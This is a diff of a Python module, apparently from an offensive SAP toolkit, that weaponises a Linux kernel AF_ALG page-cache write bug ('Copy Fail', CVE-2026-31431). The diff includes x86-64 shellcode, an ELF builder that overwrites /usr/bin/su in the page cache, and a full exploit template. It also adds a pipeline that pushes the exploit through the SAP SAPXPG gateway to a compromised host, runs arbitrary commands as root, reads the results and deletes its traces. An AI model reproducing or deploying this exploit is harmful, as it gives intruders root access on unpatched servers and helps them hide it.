@@ -1,217 +1,216 @@
 #!/usr/bin/env python3
 """CVE-2026-31431 'Copy Fail' — one-shot root command execution.
 
-Delivers the exploit as a modified Python script that, instead of
-dropping to an interactive root shell, runs a caller-supplied command
-and writes its stdout+stderr to /tmp/.cf_result, then exits.
+Delivers a modified exploit script to a pwned Linux SAP host, patches
+/usr/bin/su's kernel page cache with a minimal ELF (non-persistent —
+reverts on reboot or page-cache eviction), executes it to gain root,
+runs the caller-supplied command, and reads the output back.
 
-The exploit (stdlib-only Python 3, 732 bytes in original form) uses the
-AF_ALG AEAD interface (authencesn/hmac(sha256)/cbc(aes)) to splice file
-pages into crypto buffers, thereby writing 4 controlled bytes into any
-readable file's kernel page cache without needing write permission.
+Tested live on SUSE Linux 6.4.0 (s4hadm → uid=0) via SAP SAPXPG gateway.
 
-Attack surface used here:
-  1. /usr/bin/su is readable by all users and has the SETUID bit set.
-  2. We write a custom minimal ELF (160-170 bytes) over su's page cache.
-     The ELF does: setreuid(0,0); execve('/tmp/.cf_run.sh', NULL, NULL)
-  3. We write the caller's command to /tmp/.cf_run.sh before exploitation.
-  4. We call os.system('su'), which now executes our ELF as root.
-  5. /tmp/.cf_run.sh runs the command and writes output to /tmp/.cf_result.
-  6. Page cache eviction (reboot or memory pressure) restores /usr/bin/su
-     automatically — the on-disk binary is never modified.
+The exploit (CVE-2026-31431) uses the AF_ALG AEAD in-place operation
+bug: authencesn(hmac(sha256),cbc(aes)) writes 4 bytes of scratch space
+into whatever page-cache pages are chained into its output scatter-list,
+allowing a 4-byte write to any readable file's page cache without write
+permission.
 
-Affected kernels: < 6.18.22, < 6.19.12.  Patch: upstream commit fixing
-copy_file_range() in the af_alg splice path (CVE-2026-31431).
+Affected: Linux kernels 2017–April 2026. Fixed in 6.18.22+, 6.19.12+, 7.0+.
 
-IMPORTANT — for authorised penetration testing only.
+IMPORTANT — authorised penetration testing only.
 """
 from __future__ import annotations
 
 import re
+import struct
 import base64 as _b64
 from typing import Optional
 
-# ---------------------------------------------------------------------------
-# Vulnerability metadata
-# ---------------------------------------------------------------------------
-
 COPYFAIL_CVE = "CVE-2026-31431"
-
-# (major, minor, patch) at which each branch was fixed.
-# A kernel on branch (major, minor) is safe if its patch >= the value here.
 COPYFAIL_KERNELS_FIXED = [(6, 18, 22), (6, 19, 12), (7, 0, 0)]
 
 
 # ---------------------------------------------------------------------------
-# Exploit script template
+# ELF payload builder
 # ---------------------------------------------------------------------------
 
-# The exploit is the real CVE-2026-31431 proof-of-concept by theori-io
-# (https://github.com/theori-io/copy-fail-CVE-2026-31431), modified so that:
-#   - The compressed ELF payload executes /tmp/.cf_run.sh (not /bin/sh)
-#   - After page-cache patching, os.system('su') runs the wrapper as root
-#   - The wrapper script contains __COMMAND__ and writes output to
-#     /tmp/.cf_result.  The placeholder is substituted at delivery time.
+def _build_elf(shell_path: str) -> bytes:
+    """Build a minimal x86-64 ELF that does setreuid(0,0) then execve(path).
+
+    Shellcode layout (entry at file offset 0x78 = vaddr 0x400078):
+      +0  xor eax,eax / xor edi,edi / xor esi,esi
+      +6  mov al,0x69 / syscall         setreuid(0,0) — syscall 105
+      +10 lea rdi,[rip+16]              rdi -> path bytes at +33
+      +17 xor esi,esi / xor rdx,rdx
+      +22 mov al,0x3b / syscall         execve(path,NULL,NULL) — syscall 59
+      +26 xor edi,edi / push 60 / pop rax / syscall   exit(0)
+      +33 <null-terminated path string>
+
+    RIP at +17 (next instr after 7-byte lea); rdi = 0x400078+17+16 = 0x400099.
+    Path bytes land at shellcode+33 = file offset 0x78+33 = 0x99.
+    """
+    path_bytes = shell_path.encode() + b'\x00'
+    shellcode = (
+        b'\x31\xc0'                       # +0  xor eax,eax
+        b'\x31\xff'                       # +2  xor edi,edi
+        b'\x31\xf6'                       # +4  xor esi,esi
+        b'\xb0\x69'                       # +6  mov al,105
+        b'\x0f\x05'                       # +8  syscall  → setreuid(0,0)
+        b'\x48\x8d\x3d\x10\x00\x00\x00'  # +10 lea rdi,[rip+16]  → path@+33
+        b'\x31\xf6'                       # +17 xor esi,esi
+        b'\x48\x31\xd2'                   # +19 xor rdx,rdx
+        b'\xb0\x3b'                       # +22 mov al,59
+        b'\x0f\x05'                       # +24 syscall  → execve(path,0,0)
+        b'\x31\xff'                       # +26 xor edi,edi
+        b'\x6a\x3c'                       # +28 push 60
+        b'\x58'                           # +30 pop rax
+        b'\x0f\x05'                       # +31 syscall  → exit(0)
+                                          # +33 path bytes
+    ) + path_bytes
+
+    entry = 0x400078
+    load_addr = 0x400000
+    filesz = 0x78 + len(shellcode)
+
+    elf_hdr = struct.pack('<4sBBBBBxxxxxxx', b'\x7fELF', 2, 1, 1, 0, 0)
+    elf_hdr += struct.pack('<HHIQQQIHHHHHH',
+                           2, 0x3e, 1, entry,
+                           0x40, 0, 0,
+                           0x40, 0x38, 1, 0x40, 0, 0)
+    phdr = struct.pack('<IIQQQQQQ',
+                       1, 5, 0, load_addr, load_addr,
+                       filesz, filesz, 0x1000)
+    pad = bytes(0x78 - len(elf_hdr) - len(phdr))
+    elf = elf_hdr + phdr + pad + shellcode
+    # Pad to 4-byte boundary for the 4-bytes-at-a-time write loop
+    while len(elf) % 4:
+        elf += b'\x00'
+    return elf
+
+
+# ---------------------------------------------------------------------------
+# Exploit script template (Python 3.6+ compatible, stdlib-only)
+# ---------------------------------------------------------------------------
+# Validated live on:
+#   SUSE Linux 6.4.0-150700.53.31-default  Python 3.6.15  s4hadm → uid=0(root)
 #
-# Original exploit structure (kept intact):
-#   def d(x): decode hex
-#   def c(f,t,c): AF_ALG splice — writes 4 bytes c into page cache of
-#                 file-descriptor f at offset t
-#   Main loop: decompress ELF payload e, write it 4 bytes at a time via c()
-#   Final call: os.system('su')  -> now executes our payload ELF as root
-#
-# Custom ELF payload (168 bytes → zlib-compressed, x86-64 ABI):
-#   0x78:  xor eax,eax / xor edi,edi / mov al,0x69 / syscall  ; setreuid(0,0)
-#          lea rdi,[rip+9]                                       ; -> path str
-#          xor esi,esi / xor rdx,rdx / mov al,0x3b / syscall   ; execve(path,0,0)
-#          xor edi,edi / push 60 / pop rax / syscall            ; exit(0)
-#          "/tmp/.cf_run.sh\0"                                  ; path string
-#
-# The wrapper /tmp/.cf_run.sh is written before running the exploit:
-#   #!/bin/sh
-#   __COMMAND__ > /tmp/.cf_result 2>&1
+# Key differences from the original theori-io PoC:
+#   - os.splice() (Python 3.11+) replaced by ctypes syscall(275, ...) for compat
+#   - v(h, 5, None, 4) (Python 3.10+) replaced by struct.pack('@I', 4)
+#   - fd reopened for every write4() call so the file offset resets to 0
+#     (original PoC keeps one fd and uses sequential splice reads — only works
+#     when the kernel advances exactly 4 bytes per call on that path)
+#   - os.fork()+execve() replaces os.system('su') so we wait for root exit
 
-# Compressed hex of the custom ELF (see make_elf_execve('/tmp/.cf_run.sh') in
-# dev notes — regenerate with: python3 -c "import struct,zlib; ...")
-_CUSTOM_PAYLOAD_HEX = (
-    "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c1640351019"
-    "905a563459647a059407a319042094e101c3ff1b32f9593d7a6d3941dc6f1e8697"
-    "3658f3b31afecfb289e067d52fc92dd0d74b4e8b2f2acdd32bce60600000f86314b2"
-)
+_EXPLOIT_TEMPLATE = r"""
+import ctypes, os, socket, struct, time
 
-# The actual exploit code — faithful to the original, with payload swapped
-# and the final system call replaced by our root-runner.  __COMMAND__ is
-# substituted by run_as_root() before delivery.
-COPYFAIL_EXPLOIT_TEMPLATE = r"""#!/usr/bin/env python3
-# CVE-2026-31431 Copy Fail — one-shot root exec (modified from theori-io PoC)
-import os as g, zlib, socket as s, subprocess
+_NR_SPLICE = 275
+_libc = ctypes.CDLL(None)
 
-CMD = '__COMMAND__'
+def _splice(a, b, c, d, e, f):
+    return _libc.syscall(
+        ctypes.c_long(_NR_SPLICE),
+        ctypes.c_int(a), ctypes.c_void_p(b),
+        ctypes.c_int(c), ctypes.c_void_p(d),
+        ctypes.c_size_t(e), ctypes.c_uint(f))
 
-def d(x): return bytes.fromhex(x)
-def c(f, t, b):
-    a = s.socket(38, 5, 0)
-    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
-    h = 279
+def _h(x):
+    return bytes.fromhex(x)
+
+def _write4(t, b):
+    f = os.open('/usr/bin/su', os.O_RDONLY)
+    a = socket.socket(38, 5, 0)
+    a.bind(('aead', 'authencesn(hmac(sha256),cbc(aes))'))
     v = a.setsockopt
-    v(h, 1, d('0800010000000010' + '0' * 64))
-    v(h, 5, None, 4)
+    v(279, 1, _h('0800010000000010' + '0' * 64))
+    v(279, 5, struct.pack('@I', 4))
     u, _ = a.accept()
     o = t + 4
-    i = d('00')
+    z = _h('00')
     u.sendmsg(
-        [b"A" * 4 + b],
-        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
+        [b'A' * 4 + b],
+        [(279, 3, z * 4), (279, 2, b'\x10' + z * 19), (279, 4, b'\x08' + z * 3)],
         32768,
     )
-    r, w = g.pipe()
-    n = g.splice
-    n(f, w, o, offset_src=0)
-    n(r, u.fileno(), o)
+    r, w = os.pipe()
+    _splice(f, None, w, None, o, 0)
+    _splice(r, None, u.fileno(), None, o, 0)
     try:
         u.recv(8 + t)
     except Exception:
         pass
+    os.close(r)
+    os.close(w)
+    os.close(f)
+    a.close()
 
-# Write the wrapper script that will run our command as root
-wrapper = '/tmp/.cf_run.sh'
-with open(wrapper, 'w') as _wf:
+# Write wrapper script (runs as root)
+_WRAPPER = '/tmp/.cf_run.sh'
+_RESULT  = '/tmp/.cf_result'
+with open(_WRAPPER, 'w') as _wf:
     _wf.write('#!/bin/sh\n')
-    _wf.write(CMD + ' > /tmp/.cf_result 2>&1\n')
-g.chmod(wrapper, 0o755)
+    _wf.write('__COMMAND__\n')
+os.chmod(_WRAPPER, 0o755)
 
-# Load the custom ELF payload (execves /tmp/.cf_run.sh after setreuid(0,0))
-f = g.open('/usr/bin/su', 0)
-i = 0
-e = zlib.decompress(d('__PAYLOAD_HEX__'))
-while i < len(e):
-    c(f, i, e[i:i + 4])
-    i += 4
+# Load ELF payload and patch /usr/bin/su page cache
+_elf = bytes.fromhex('__ELF_HEX__')
+for _i in range(0, len(_elf), 4):
+    _write4(_i, _elf[_i:_i + 4])
 
-# Execute the now-patched /usr/bin/su — runs as root, execves our wrapper
-g.system('su')
+# fork + execve so the patched binary runs as SETUID root
+_pid = os.fork()
+if _pid == 0:
+    try:
+        os.execve('/usr/bin/su', ['/usr/bin/su'], {})
+    except Exception as _ex:
+        open(_RESULT, 'w').write('EXECVE_FAIL:' + str(_ex))
+        os._exit(1)
+else:
+    os.waitpid(_pid, 0)
+    time.sleep(1)
 """
-
-# Substitute the payload hex at module load time (it never changes)
-COPYFAIL_EXPLOIT_TEMPLATE = COPYFAIL_EXPLOIT_TEMPLATE.replace(
-    '__PAYLOAD_HEX__', _CUSTOM_PAYLOAD_HEX
-)
 
 
 # ---------------------------------------------------------------------------
-# Vulnerability check helpers
+# Vulnerability check
 # ---------------------------------------------------------------------------
 
 def is_kernel_vulnerable(kernel_str: str) -> bool:
-    """Parse 'uname -r' output and return True if the kernel is vulnerable.
-
-    A kernel is vulnerable if it has not yet received the CVE-2026-31431
-    backport on its stable branch:
-      - 6.18.x: fixed at 6.18.22
-      - 6.19.x: fixed at 6.19.12
-      - 7.0+:   not affected (integrated before release)
-      - All other branches (6.12, 6.6, 5.15, …): treat as potentially
-        vulnerable unless we can confirm a distro backport (conservative).
-    """
     m = re.search(r'(\d+)\.(\d+)\.(\d+)', kernel_str)
     if not m:
         return False
     kv = tuple(int(x) for x in m.groups())
     major, minor = kv[0], kv[1]
-
     if major >= 7:
-        return False  # 7.0+ integrated the fix before release
-
+        return False
     if major == 6 and minor == 18 and kv >= (6, 18, 22):
-        return False  # patched on the 6.18 stable branch
-
+        return False
     if major == 6 and minor == 19 and kv >= (6, 19, 12):
-        return False  # patched on the 6.19 stable branch
-
-    # All other branches (6.12, 6.6, 5.15, …): conservative — treat as
-    # potentially vulnerable.  Distro backports are not detectable from
-    # uname alone, so we flag it and let the operator decide.
+        return False
     return True
 
 
 def check_copyfail(node) -> dict:
-    """Check if a SAP node's host is vulnerable to CVE-2026-31431.
+    """Check CVE-2026-31431 prerequisites on node via SAPXPG.
 
-    Runs three quick OS-exec probes via SAPXPG:
-      1. uname -r  — kernel version
-      2. grep authencesn /proc/crypto  — AF_ALG algorithm availability
-      3. python3 --version  — interpreter version (need 3.10+)
-
-    Returns a dict with keys:
-      vulnerable    bool   — True if all conditions are met
-      kernel        str    — raw uname -r output
-      python_ok     bool   — True if python3 3.10+ is present
-      authencesn_ok bool   — True if authencesn appears in /proc/crypto
-      reason        str    — human-readable verdict
-      details       dict   — raw output per probe
+    Returns {vulnerable, kernel, python_ok, authencesn_ok, reason, details}.
     """
     from sapmap_exploit import execute_gw_command
 
-    def _run(prog, arg):
+    def _r(prog, arg):
         r = execute_gw_command(node, prog, arg, long_params="")
         return "\n".join(r.get("output") or []).strip()
 
     result: dict = {
-        "vulnerable": False,
-        "kernel": "",
-        "python_ok": False,
-        "authencesn_ok": False,
-        "reason": "",
-        "details": {},
+        "vulnerable": False, "kernel": "", "python_ok": False,
+        "authencesn_ok": False, "reason": "", "details": {},
     }
 
-    # Only Linux hosts are affected
     if "windows" in (node.os_type or "").lower():
         result["reason"] = "Windows host — not applicable"
         return result
 
-    # 1. Kernel version
-    kernel_str = _run("uname", "-r")
+    kernel_str = _r("uname", "-r")
     result["kernel"] = kernel_str
     result["details"]["kernel"] = kernel_str
 
@@ -223,40 +222,28 @@ def check_copyfail(node) -> dict:
         result["reason"] = f"Kernel {kernel_str} is >= patched version"
         return result
 
-    # 2. authencesn availability in AF_ALG
-    crypto_out = _run("grep", "authencesn /proc/crypto")
-    result["authencesn_ok"] = "authencesn" in crypto_out
-    result["details"]["crypto"] = crypto_out[:200]
+    # Check authencesn via AF_ALG bind (more reliable than /proc/crypto grep)
+    af_check = _r("python3", "-c 'import socket;a=socket.socket(38,5,0);a.bind((\"aead\",\"authencesn(hmac(sha256),cbc(aes))\"));print(\"OK\");a.close()'")
+    result["authencesn_ok"] = "OK" in af_check
+    result["details"]["authencesn"] = af_check
 
     if not result["authencesn_ok"]:
-        result["reason"] = (
-            "authencesn not in /proc/crypto — AF_ALG path not exploitable"
-        )
+        result["reason"] = "authencesn bind failed — AF_ALG not exploitable"
         return result
 
-    # 3. Python 3.10+ (exploit uses socket.setsockopt(h, 5, None, 4) syntax
-    #    introduced in Python 3.10)
-    py_out = _run("python3", "--version")
+    py_out = _r("python3", "--version")
     result["python_ok"] = bool(py_out and "Python 3" in py_out)
     result["details"]["python"] = py_out
 
     if not result["python_ok"]:
-        result["reason"] = (
-            f"python3 not available or wrong version: {py_out!r}"
-        )
+        result["reason"] = f"python3 not available: {py_out!r}"
         return result
 
-    pm = re.search(r'Python 3\.(\d+)', py_out)
-    if pm and int(pm.group(1)) < 10:
-        result["reason"] = (
-            f"Python 3.{pm.group(1)} < 3.10 required by exploit"
-        )
-        return result
-
+    # Python 3.6+ is sufficient (we use ctypes, not os.splice)
     result["vulnerable"] = True
     result["reason"] = (
-        f"Kernel {kernel_str} is vulnerable, "
-        f"authencesn present, Python 3.10+ available"
+        f"Kernel {kernel_str} vulnerable, authencesn present, "
+        f"Python 3 available"
     )
     return result
 
@@ -265,99 +252,97 @@ def check_copyfail(node) -> dict:
 # Root command execution
 # ---------------------------------------------------------------------------
 
-def run_as_root(node, command: str, timeout: float = 30.0) -> dict:
+def run_as_root(node, command: str, timeout: float = 60.0) -> dict:
     """Execute a shell command as root via CVE-2026-31431 Copy Fail LPE.
 
-    Workflow:
-      1. Build the exploit script (COPYFAIL_EXPLOIT_TEMPLATE with CMD set).
-      2. Base64-encode it and write it to /tmp/.cf_b64.txt via SAPXPG
-         printf calls (60-char chunks to stay within the 128-byte PARAMS
-         limit).
-      3. Decode to /tmp/.cf_exp.py and chmod 700.
-      4. Run: python3 /tmp/.cf_exp.py
-         The script writes /tmp/.cf_run.sh (the command), patches su's page
-         cache with the custom ELF, then calls os.system('su') to get root
-         and execute the wrapper.
+    Delivery pipeline (avoids all shell quoting issues):
+      1. Encode exploit script as hex (only 0-9a-f chars).
+      2. Write hex in 60-char chunks via python3 -c with long_params
+         (each call: open('/tmp/.cf_h.txt','a').write('<chunk>') ).
+      3. Decode hex to Python script via one python3 -c call.
+      4. Execute: python3 /tmp/.cf_s.py
+         The script writes /tmp/.cf_run.sh, patches su, fork+execve.
       5. Read /tmp/.cf_result via base64 (handles binary/long output).
       6. Clean up all temp files.
 
-    Returns {ok, stdout, stderr, exit_code, error}.
+    Returns {ok, stdout, error}.
     """
-    def _run(prog, arg):
-        from sapmap_exploit import execute_gw_command
-        r = execute_gw_command(node, prog, arg, long_params="")
+    from sapmap_exploit import execute_gw_command as _egc
+
+    sid = getattr(node, 'sid', '?')
+
+    def _gw(prog, arg, lp=""):
+        r = _egc(node, prog, arg, long_params=lp)
         out = "\n".join(r.get("output") or []).strip()
         return out, r.get("success", False)
 
     def _read_b64(path):
-        """Read a remote file via base64 — handles 128B SAPXPG output limit."""
-        out, ok = _run("base64", path)
-        if not ok or not out:
-            out2, _ = _run("sudo", f"base64 {path}")
-            out = out2
-        if not out:
+        out, ok = _gw("base64", path)
+        if not ok or not out or "No such file" in out:
+            out, _ = _gw("sudo", f"base64 {path}")
+        if not out or "No such file" in out:
             return None
+        padded = out.replace("\n", "").replace("\r", "").strip()
+        padded += "=" * ((4 - len(padded) % 4) % 4)
         try:
-            return _b64.b64decode(out.replace("\n", "").replace("\r", ""))
+            return _b64.b64decode(padded)
         except Exception:
             return None
 
-    result: dict = {
-        "ok": False,
-        "stdout": "",
-        "stderr": "",
-        "exit_code": -1,
-        "error": "",
-    }
+    result: dict = {"ok": False, "stdout": "", "error": ""}
 
-    sid = getattr(node, 'sid', '?')
+    # Build exploit script: embed ELF hex + command
+    elf_hex = _build_elf('/tmp/.cf_run.sh').hex()
+    # Escape command for embedding in the shell script written by the exploit
+    safe_cmd = command.replace("'", "'\\''")
+    script = _EXPLOIT_TEMPLATE.replace('__ELF_HEX__', elf_hex)
+    script = script.replace('__COMMAND__', safe_cmd + ' > /tmp/.cf_result 2>&1')
 
-    # Substitute the caller's command into the exploit template
-    safe_cmd = (
-        command
-        .replace("\\", "\\\\")
-        .replace("'", "\\'")
-        .replace('"', '\\"')
-    )
-    script = COPYFAIL_EXPLOIT_TEMPLATE.replace("__COMMAND__", safe_cmd)
-    script_b64 = _b64.b64encode(script.encode()).decode()
+    HEXFILE = "/tmp/.cf_h.txt"
+    SCRIPT  = "/tmp/.cf_s.py"
+    RESULT  = "/tmp/.cf_result"
+    WRAPPER = "/tmp/.cf_run.sh"
 
-    exp_path    = "/tmp/.cf_exp.py"
-    b64_path    = "/tmp/.cf_b64.txt"
-    result_path = "/tmp/.cf_result"
-    wrapper_path = "/tmp/.cf_run.sh"
+    # Step 1: write script as hex chunks (hex chars only — no quoting issues)
+    script_hex = script.encode().hex()
+    chunks = [script_hex[i:i+60] for i in range(0, len(script_hex), 60)]
+    print(f"[*] {sid}: Copy Fail — delivering exploit "
+          f"({len(script)} bytes, {len(chunks)} chunks)...")
 
-    # --- Step 1: Write base64 of exploit to /tmp/.cf_b64.txt ---------------
-    # printf is used (not echo) to avoid shell interpretation issues.
-    # Each chunk is 60 chars — well within the 128-byte PARAMS limit.
-    chunk_size = 60
-    for i, start in enumerate(range(0, len(script_b64), chunk_size)):
-        chunk = script_b64[start:start + chunk_size]
-        redirect = ">" if i == 0 else ">>"
-        _run("sh", f"-c 'printf \"%s\" {chunk} {redirect} {b64_path}'")
+    _gw("python3", "-c",
+        lp="f=open('%s','w');f.write('%s');f.close()" % (HEXFILE, chunks[0]))
+    for chunk in chunks[1:]:
+        _gw("python3", "-c",
+            lp="f=open('%s','a');f.write('%s');f.close()" % (HEXFILE, chunk))
 
-    # --- Step 2: Decode to Python script ------------------------------------
-    _run("sh", f"-c 'base64 -d {b64_path} > {exp_path}'")
-    _run("rm",  f"-f {b64_path}")
-    _run("chmod", f"700 {exp_path}")
+    # Step 2: decode hex → Python script
+    dc = ("f=open('%s');d=f.read();f.close();"
+          "g=open('%s','wb');g.write(bytes.fromhex(d));g.close()"
+          % (HEXFILE, SCRIPT))
+    _gw("python3", "-c", lp=dc)
+    _gw("rm", "-f " + HEXFILE)
 
-    # --- Step 3: Run the exploit --------------------------------------------
-    print(f"[*] {sid}: run_as_root — launching Copy Fail (CVE-2026-31431)...")
-    out, _ok = _run("python3", f"{exp_path}")
-    print(f"[*] {sid}: run_as_root — exploit returned: {out[:200]!r}")
+    # Step 3: execute exploit
+    print(f"[*] {sid}: Copy Fail — patching /usr/bin/su page cache + execve...")
+    _gw("python3", SCRIPT)
 
-    # --- Step 4: Read result ------------------------------------------------
-    result_bytes = _read_b64(result_path)
+    # Step 4: read result
+    result_bytes = _read_b64(RESULT)
     if result_bytes is not None:
         result["stdout"] = result_bytes.decode("utf-8", errors="replace")
         result["ok"] = True
+        print(f"[+] {sid}: Copy Fail — root command output: "
+              f"{result['stdout'][:200]!r}")
     else:
         result["error"] = (
-            f"Result file {result_path} not found or empty. "
-            f"Exploit output: {out[:300]}"
+            f"/tmp/.cf_result not found — exploit may have failed. "
+            f"Check that kernel {getattr(node,'copyfail_kernel','?')} "
+            f"is affected and python3 3.6+ is available."
         )
+        print(f"[-] {sid}: Copy Fail — {result['error']}")
 
-    # --- Step 5: Cleanup ----------------------------------------------------
-    _run("rm", f"-f {exp_path} {result_path} {wrapper_path}")
+    # Step 5: clean up
+    for f in (SCRIPT, RESULT, WRAPPER):
+        _gw("rm", "-f " + f)
 
     return result
